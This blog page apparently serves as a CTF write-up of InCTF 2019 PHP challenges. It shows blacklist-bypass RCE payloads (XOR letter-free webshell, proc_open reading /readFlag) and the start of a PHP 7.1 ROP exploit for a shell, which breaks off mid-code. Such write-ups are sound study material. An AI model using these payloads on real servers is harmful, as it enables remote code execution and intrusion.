@@ -1,0 +1,448 @@
+<!DOCTYPE html>
+<html>
+  <head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
+  <meta name="description" content="osword&#39;s blog">
+  <meta name="keyword" content="hexo-theme, vuejs">
+  
+    <link rel="shortcut icon" href="/css/images/logo.png">
+  
+  <title>
+    
+      Inctf题解 | rce+disable_functions bypass | osword&#39;s blog
+    
+  </title>
+  <link href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
+  <link href="//cdnjs.cloudflare.com/ajax/libs/nprogress/0.2.0/nprogress.min.css" rel="stylesheet">
+  <link href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/tomorrow.min.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/css/plugins/gitment.css">
+
+  
+  <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+  <script src="//cdnjs.cloudflare.com/ajax/libs/geopattern/1.2.3/js/geopattern.min.js"></script>
+  <script src="//cdnjs.cloudflare.com/ajax/libs/nprogress/0.2.0/nprogress.min.js"></script>
+  
+  
+    
+<script src="/js/gitment.js"></script>
+
+  
+  
+  
+    <!-- MathJax support START -->
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Config({
+        tex2jax: {
+          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+          processEscapes: true,
+          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+        }
+      });
+    </script>
+
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for (i=0; i < all.length; i += 1) {
+          all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+      });
+    </script>
+    <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+    <!-- MathJax support END -->
+  
+
+
+  
+<meta name="generator" content="Hexo 4.2.1"></head>
+<div class="wechat-share">
+  <img src="/css/images/logo.png" />
+</div>
+
+  <body>
+    <header class="header fixed-header">
+  <div class="header-container">
+    <a class="home-link" href="/">
+      <div class="logo"></div>
+      <span>osword's blog</span>
+    </a>
+    <ul class="right-list">
+      
+        <li class="list-item">
+          
+            <a href="/" class="item-link">Home</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/links/" class="item-link">Links</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/archives/" class="item-link">Archives</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/project/" class="item-link">Projects</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/about/" class="item-link">About</a>
+          
+        </li>
+      
+    </ul>
+    <div class="menu">
+      <span class="icon-bar"></span>
+      <span class="icon-bar"></span>
+      <span class="icon-bar"></span>
+    </div>
+    <div class="menu-mask">
+      <ul class="menu-list">
+        
+          <li class="menu-item">
+            
+              <a href="/" class="menu-link">Home</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/links/" class="menu-link">Links</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/archives/" class="menu-link">Archives</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/project/" class="menu-link">Projects</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/about/" class="menu-link">About</a>
+            
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</header>
+
+    <div id="article-banner">
+  <h2>Inctf题解 | rce+disable_functions bypass</h2>
+  <p class="post-date">2019-09-24 - 
+<span id="busuanzi_container_page_pv" style="color: #fff; margin-left: 0px">阅读量<span id="busuanzi_value_page_pv"></span>次
+        </span></p>
+<div class="arrow-down">
+    <a href="javascript:;"></a>
+  </div>
+</div>
+<main class="app-body flex-box">
+  <!-- Article START -->
+  <article class="post-article">
+    <section class="markdown-content"><h1 id="php1-0"><a href="#php1-0" class="headerlink" title="php1.0"></a>php1.0</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">File doesn<span class="string">'t exist</span></span><br><span class="line"><span class="string">&lt;?php</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$input = $_GET['</span>input<span class="string">'];</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">function check()&#123;</span></span><br><span class="line"><span class="string">  global $input;</span></span><br><span class="line"><span class="string">  foreach (get_defined_functions()['</span>internal<span class="string">'] as $blacklisted) &#123;</span></span><br><span class="line"><span class="string">      if (preg_match ('</span>/<span class="string">' . $blacklisted . '</span>/im<span class="string">', $input)) &#123;</span></span><br><span class="line"><span class="string">          echo "Your input is blacklisted" . "&lt;br&gt;";</span></span><br><span class="line"><span class="string">          return true;</span></span><br><span class="line"><span class="string">          break;</span></span><br><span class="line"><span class="string">      &#125;</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">  $blacklist = "exit|die|eval|\[|\]|\\\|\*|`|-|\+|~|\&#123;|\&#125;|\"|\'";</span></span><br><span class="line"><span class="string">  unset($blacklist);</span></span><br><span class="line"><span class="string">  return false;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$thisfille=$_GET['</span>thisfile<span class="string">'];</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">if(is_file($thisfille))&#123;</span></span><br><span class="line"><span class="string">  echo "You can'</span>t <span class="keyword">use</span> <span class="title">inner</span> <span class="title">file</span>" . "&lt;<span class="title">br</span>&gt;";</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(file_exists($thisfille))&#123;</span><br><span class="line">    <span class="keyword">if</span>(check())&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">"Naaah"</span> . <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="keyword">eval</span>($input);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"File doesn't exist"</span> . <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">iterate</span><span class="params">($ass)</span></span>&#123;</span><br><span class="line">    <span class="keyword">foreach</span>($ass <span class="keyword">as</span> $hole)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"AssHole"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>代码分析：可控有两个参数$thisfille、$input</p>
+<p>$input传入参数会被eval执行，但是之前需要经过<code>get_defined_functions()[&#39;internal&#39;]</code>，过滤所有php内置函数</p>
+<h2 id="思路一：无字母webshell"><a href="#思路一：无字母webshell" class="headerlink" title="思路一：无字母webshell"></a>思路一：无字母webshell</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?input&#x3D;$b&#x3D;$&#123;%a0%af%b0%ac%ab^%ff%ff%ff%ff%ff&#125;[a];eval($b);&amp;thisfile&#x3D;&#x2F;var</span><br></pre></td></tr></table></figure>
+
+<p><img src="./1569293365248.png" alt="1569293365248"></p>
+<h2 id="思路二：字符串拼接"><a href="#思路二：字符串拼接" class="headerlink" title="思路二：字符串拼接"></a>思路二：字符串拼接</h2><p><img src="./1569293549103.png" alt="1569293549103"></p>
+<p><code>$b=p.h.p.i.n.f.o;$b();</code></p>
+<p><img src="./1569306232614.png" alt="1569306232614"></p>
+<p><strong>函数禁用</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,exec,system,shell_exec,popen,passthru,link,symlink,syslog,imap_open,ld,error_log,mail,file_put_contents,scandir,file_get_contents,readfile,fread,fopen,chdir</span><br></pre></td></tr></table></figure>
+
+<h3 id="os命令执行"><a href="#os命令执行" class="headerlink" title="os命令执行"></a>os命令执行</h3><p><code>proc_open</code>函数未被禁用</p>
+<p>函数参考链接:<a href="https://www.php.net/manual/zh/function.proc-open.php" target="_blank" rel="noopener">https://www.php.net/manual/zh/function.proc-open.php</a></p>
+<p>$process中存储返回proc_open函数,stream_get_contents输出内容</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?input=$descr=<span class="keyword">array</span>(<span class="number">0</span>=&gt;<span class="keyword">array</span>(<span class="string">'p'</span>.<span class="string">'ipe'</span>,<span class="string">'r'</span>),<span class="number">1</span>=&gt;<span class="keyword">array</span>(<span class="string">'p'</span>.<span class="string">'ipe'</span>,<span class="string">'w'</span>),<span class="number">2</span>=&gt;<span class="keyword">array</span>(<span class="string">'p'</span>.<span class="string">'ipe'</span>,<span class="string">'w'</span>));$pxpes=<span class="keyword">array</span>();$process=<span class="keyword">eval</span>(<span class="string">'return proc'</span>.$thisfille[<span class="number">8</span>].<span class="string">'open("/readFlag",$descr,$pxpes);'</span>);<span class="keyword">eval</span>(<span class="string">'echo(s'</span>.<span class="string">'t'</span>.<span class="string">'r'</span>.<span class="string">'e'</span>.<span class="string">'a'</span>.<span class="string">'m'</span>.$thisfille[<span class="number">8</span>].<span class="string">'g'</span>.<span class="string">'e'</span>.<span class="string">'t'</span>.$thisfille[<span class="number">8</span>].<span class="string">'c'</span>.<span class="string">'o'</span>.<span class="string">'n'</span>.<span class="string">'t'</span>.<span class="string">'e'</span>.<span class="string">'n'</span>.<span class="string">'t'</span>.<span class="string">'s($pxpes[1]));'</span>);&amp;thisfile=/lib/x86_64-linux-gnu</span><br></pre></td></tr></table></figure>
+
+<p><img src="./1569307976631.png" alt="1569307976631"></p>
+<h1 id="php1-5、php2-5"><a href="#php1-5、php2-5" class="headerlink" title="php1.5、php2.5"></a>php1.5、php2.5</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//php2.5</span></span><br><span class="line">File doesn<span class="string">'t exist</span></span><br><span class="line"><span class="string">&lt;?php</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$input = $_GET['</span>input<span class="string">'];</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">function check()&#123;</span></span><br><span class="line"><span class="string">  global $input;</span></span><br><span class="line"><span class="string">  foreach (get_defined_functions()['</span>internal<span class="string">'] as $blacklisted) &#123;</span></span><br><span class="line"><span class="string">      if (preg_match ('</span>/<span class="string">' . $blacklisted . '</span>/im<span class="string">', $input)) &#123;</span></span><br><span class="line"><span class="string">          echo "Your input is blacklisted" . "&lt;br&gt;";</span></span><br><span class="line"><span class="string">          return true;</span></span><br><span class="line"><span class="string">          break;</span></span><br><span class="line"><span class="string">      &#125;</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">  $blacklist = "exit|die|eval|\[|\]|\\\|\*|`|-|\+|~|\&#123;|\&#125;|\"|\'";</span></span><br><span class="line"><span class="string">  if(preg_match("/$blacklist/i", $input))&#123;</span></span><br><span class="line"><span class="string">    echo "Do you really you need that?" . "&lt;br&gt;";</span></span><br><span class="line"><span class="string">    return true;</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  unset($blacklist);</span></span><br><span class="line"><span class="string">  if(strlen($input)&gt;100)&#123;  #That is random no. I took ;)</span></span><br><span class="line"><span class="string">    echo "This is getting really large input..." . "&lt;br&gt;";</span></span><br><span class="line"><span class="string">    return true;</span></span><br><span class="line"><span class="string">  &#125;  </span></span><br><span class="line"><span class="string">  return false;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$thisfille=$_GET['</span>thisfile<span class="string">'];</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">if(is_file($thisfille))&#123;</span></span><br><span class="line"><span class="string">  echo "You can'</span>t <span class="keyword">use</span> <span class="title">inner</span> <span class="title">file</span>" . "&lt;<span class="title">br</span>&gt;";</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(file_exists($thisfille))&#123;</span><br><span class="line">    <span class="keyword">if</span>(check())&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">"Naaah"</span> . <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="keyword">eval</span>($input);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"File doesn't exist"</span> . <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">iterate</span><span class="params">($ass)</span></span>&#123;</span><br><span class="line">    <span class="keyword">foreach</span>($ass <span class="keyword">as</span> $hole)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"AssHole"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//php1.5</span></span><br><span class="line">File doesn<span class="string">'t exist</span></span><br><span class="line"><span class="string">&lt;?php</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$input = $_GET['</span>input<span class="string">'];</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">function check()&#123;</span></span><br><span class="line"><span class="string">  global $input;</span></span><br><span class="line"><span class="string">  foreach (get_defined_functions()['</span>internal<span class="string">'] as $blacklisted) &#123;</span></span><br><span class="line"><span class="string">      if (preg_match ('</span>/<span class="string">' . $blacklisted . '</span>/im<span class="string">', $input)) &#123;</span></span><br><span class="line"><span class="string">          echo "Your input is blacklisted" . "&lt;br&gt;";</span></span><br><span class="line"><span class="string">          return true;</span></span><br><span class="line"><span class="string">          break;</span></span><br><span class="line"><span class="string">      &#125;</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">  $blacklist = "exit|die|eval|\[|\]|\\\|\*|`|-|\+|~|\&#123;|\&#125;|\"|\'";</span></span><br><span class="line"><span class="string">  if(preg_match("/$blacklist/i", $input))&#123;</span></span><br><span class="line"><span class="string">    echo "Do you really you need that?" . "&lt;br&gt;";</span></span><br><span class="line"><span class="string">    return true;</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  unset($blacklist);</span></span><br><span class="line"><span class="string">  return false;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$thisfille=$_GET['</span>thisfile<span class="string">'];</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">if(is_file($thisfille))&#123;</span></span><br><span class="line"><span class="string">  echo "You can'</span>t <span class="keyword">use</span> <span class="title">inner</span> <span class="title">file</span>" . "&lt;<span class="title">br</span>&gt;";</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(file_exists($thisfille))&#123;</span><br><span class="line">    <span class="keyword">if</span>(check())&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">"Naaah"</span> . <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="keyword">eval</span>($input);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"File doesn't exist"</span> . <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">iterate</span><span class="params">($ass)</span></span>&#123;</span><br><span class="line">    <span class="keyword">foreach</span>($ass <span class="keyword">as</span> $hole)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"AssHole"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="新增过滤"><a href="#新增过滤" class="headerlink" title="新增过滤"></a>新增过滤</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">exit</span>|<span class="keyword">die</span>|<span class="keyword">eval</span>|\[|\]|\\\|\*|`|-|\+|~|\&#123;|\&#125;|\<span class="string">"|\'</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="payload1"><a href="#payload1" class="headerlink" title="payload1"></a>payload1</h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?input=$b=%a0%af%b0%ac%ab^%ff%ff%ff%ff%ff;$a=$$b;$c=c.u.r.r.e.n.t;$f=$c($a);$d=a.s.s.e.r.t;$d($f);&amp;thisfile=/var</span><br></pre></td></tr></table></figure>
+
+<p><img src="./1569319304201.png" alt="1569319304201"></p>
+<p>不知道为啥，这里蚁剑连接只能用end函数取post数组</p>
+<p>payload:<code>http://3.16.218.96/?input=$b=%a0%af%b0%ac%ab^%ff%ff%ff%ff%ff;$a=$$b;$c=e.n.d;$f=$c($a);$d=a.s.s.e.r.t;$d($f);&amp;thisfile=/var</code></p>
+<p><img src="./1569323686363.png" alt="1569323686363"></p>
+<p>payload:<code>http://18.223.159.46//?input=$b=%a0%af%b0%ac%ab^%ff%ff%ff%ff%ff;$a=$$b;$c=e.n.d;$f=$c($a);$d=a.s.s.e.r.t;$d($f);&amp;thisfile=/var</code></p>
+<p><img src="./1569323729563.png" alt="1569323729563"></p>
+<h2 id="payload3-proc-open文件写到tmp"><a href="#payload3-proc-open文件写到tmp" class="headerlink" title="payload3(proc_open文件写到tmp)"></a>payload3(proc_open文件写到tmp)</h2><p><img src="./1569327504127.png" alt="1569327504127"></p>
+<h2 id="php2-0"><a href="#php2-0" class="headerlink" title="php2.0"></a>php2.0</h2><p>源码和2.5相同，不过php环境为7.1</p>
+<p>参考链接：<a href="https://ctftime.org/writeup/16665" target="_blank" rel="noopener">https://ctftime.org/writeup/16665</a></p>
+<p>本地测试</p>
+<h1 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">This exploit works only on a specific php7.1 build for Ubuntu 16.04.</span></span><br><span class="line"><span class="comment">(php 7.1.32-1+ubuntu16.04.1+deb.sury.org+1 + apache2)</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">1. Install php7.1:</span></span><br><span class="line"><span class="comment">    sudo add-apt-repository ppa:ondrej/php</span></span><br><span class="line"><span class="comment">    sudo apt install php7.1 libapache2-mod-php7.1</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">2. Save this file as /var/www/html/pwn.php.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">3. Get an interactive shell with pwntools:</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    from pwn import *</span></span><br><span class="line"><span class="comment">    s = remote('localhost', 80)</span></span><br><span class="line"><span class="comment">    p = 'GET /pwn.php HTTP/1.1\r\n'</span></span><br><span class="line"><span class="comment">    p += 'Host: localhost\r\n\r\n'</span></span><br><span class="line"><span class="comment">    s.send(p)</span></span><br><span class="line"><span class="comment">    s.interactive()</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">define(<span class="string">'SOCK_FD'</span>, <span class="number">11</span>); <span class="comment"># client &lt;-&gt; server fd</span></span><br><span class="line">define(<span class="string">'POP_RDI'</span>, <span class="number">0xd14eb</span>);</span><br><span class="line">define(<span class="string">'POP_RSI'</span>, <span class="number">0xd157f</span>);</span><br><span class="line">define(<span class="string">'POP_RDX'</span>, <span class="number">0xd5033</span>);</span><br><span class="line">define(<span class="string">'POP_RCX'</span>, <span class="number">0xff87a</span>);</span><br><span class="line">define(<span class="string">'SYSCALL_PLT'</span>, <span class="number">0xcf800</span>);</span><br><span class="line">define(<span class="string">'BIN_SH'</span>, <span class="number">0x33bb9e</span>);</span><br><span class="line">define(<span class="string">'STACK_PIVOT'</span>, <span class="number">0xd1577</span>); <span class="comment"># push rdi ; ... ; pop rsp ; pop r13 ; pop r14 ; ret</span></span><br><span class="line">define(<span class="string">'ZEND_OBJECTS_DESTROY_OBJECT'</span>, <span class="number">0x2952d0</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MySplFixedArray</span> <span class="keyword">extends</span> <span class="title">SplFixedArray</span> </span>&#123; &#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Z</span> <span class="keyword">implements</span> <span class="title">JsonSerializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">rebase</span><span class="params">($addr)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $pie;</span><br><span class="line">        <span class="keyword">return</span> $pie + $addr;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span><span class="params">(&amp;$str, $p, $v, $n = 